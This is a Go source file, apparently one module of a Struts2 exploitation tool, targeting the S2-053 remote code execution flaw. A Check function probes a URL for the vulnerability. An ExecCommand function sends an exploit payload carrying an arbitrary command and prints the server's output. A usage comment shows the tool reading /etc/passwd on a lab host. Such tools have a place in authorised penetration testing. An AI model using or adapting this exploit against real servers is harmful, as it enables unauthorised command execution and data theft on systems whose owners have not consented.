package s053

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-053/ --vn 53 --data "name=fuckit" --mode exec --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS053Check)
	if utils.IfContainsStr(respString, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-053！"))
	} else {
		log.Printf("%s Struts2-053 Not Vulnerable.", utils.Green(targetUrl))
	}

}

func ExecCommand(targetUrl string, command string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS053Exec(command))
	execResult := utils.GetBetweenStr(respString, "s053execstart", "s053execend")
	fmt.Println(url.QueryUnescape(execResult))
}
